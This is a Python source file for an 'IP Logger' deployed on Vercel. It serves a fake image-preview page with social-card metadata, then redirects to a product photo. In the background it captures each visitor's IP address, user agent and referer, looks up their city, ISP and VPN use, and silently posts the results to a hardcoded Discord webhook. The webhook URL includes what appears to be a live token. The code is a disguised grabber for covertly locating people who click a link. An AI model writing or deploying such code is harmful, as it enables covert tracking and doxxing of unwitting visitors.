from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, json, os

__app__ = "Vercel IP Logger"
__description__ = "Lightweight IP collection tool for Vercel"
__version__ = "v1.0"

# Configuration
WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz")
IMAGE_URL = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg"

def log_to_discord(ip, user_agent, referer=None):
    """Send IP information to Discord"""
    try:
        # Get IP information from ip-api
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3).json()
        
        # Create Discord embed
        embed = {
            "username": "IP Logger",
            "embeds": [{
                "title": "New IP Captured",
                "color": 0x00FFFF,
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "Country", "value": ip_info.get('country', 'Unknown'), "inline": True},
                    {"name": "Region", "value": ip_info.get('regionName', 'Unknown'), "inline": True},
                    {"name": "City", "value": ip_info.get('city', 'Unknown'), "inline": True},
                    {"name": "ISP", "value": ip_info.get('isp', 'Unknown'), "inline": True},
                    {"name": "VPN/Proxy", "value": "Yes" if ip_info.get('proxy') else "No", "inline": True},
                    {"name": "User Agent", "value": f"```{user_agent[:1000]}```", "inline": False}
                ]
            }]
        }
        
        # Add referer if available
        if referer:
            embed["embeds"][0]["fields"].append(
                {"name": "Referer", "value": referer, "inline": False}
            )
        
        # Send to Discord
        requests.post(WEBHOOK_URL, json=embed, timeout=3)
    except Exception as e:
        # Fail silently - we don't want to break the user experience
        pass

def get_html_template(image_url):
    """Generate simple HTML template"""
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>Image Preview</title>
    <meta property="og:image" content="{image_url}">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        body {{
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }}
        .container {{
            text-align: center;
        }}
        img {{
            max-width: 90%;
            max-height: 80vh;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }}
        .loading {{
            color: #666;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img src="{image_url}" alt="Preview Image">
        <div class="loading">Loading full image...</div>
    </div>
    <script>
        // Redirect to actual image after a short delay
        setTimeout(function() {{
            window.location.href = "{image_url}";
        }}, 1500);
    </script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get client IP from Vercel headers
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not ip:
                ip = self.headers.get('x-real-ip', 'Unknown')
            
            # Get user agent
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Get referer
            referer = self.headers.get('referer', None)
            
            # Parse query parameters
            query = parse.parse_qs(parse.urlparse(self.path).query)
            image_url = IMAGE_URL
            
            # Log to Discord (async - don't wait for completion)
            log_to_discord(ip, user_agent, referer)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(get_html_template(image_url).encode())
            
        except Exception as e:
            # Simplified error handling
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Error loading image')

# Vercel handler
def vercel_handler(request):
    from io import BytesIO
    import sys
    
    # Create wrapper for Vercel environment
    class VercelRequestWrapper:
        def __init__(self, request):
            self.request = request
            self.headers = request.headers
            self.path = request.path
            self.command = request.method
            self.wfile = BytesIO()
            self.rfile = BytesIO(request.get_body())
            
        def get_response(self):
            self.wfile.seek(0)
            body = self.wfile.read()
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'text/html'},
                'body': body.decode('utf-8')
            }
    
    # Process request
    wrapper = VercelRequestWrapper(request)
    handler = Handler()
    handler.headers = wrapper.headers
    handler.path = wrapper.path
    handler.command = wrapper.command
    handler.wfile = wrapper.wfile
    handler.rfile = wrapper.rfile
    handler.do_GET()
    
    return wrapper.get_response()

# Export for Vercel
if os.getenv('VERCEL'):
    from http.server import BaseHTTPRequestHandler
    
    class VercelHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                # Simplified Vercel-compatible handler
                ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
                user_agent = self.headers.get('user-agent', 'Unknown')
                
                # Log to Discord
                log_to_discord(ip, user_agent)
                
                # Send response
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(get_html_template(IMAGE_URL).encode())
                
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Server Error')
    
    # Export handler
    def handler(request):
        return VercelHandler(request)
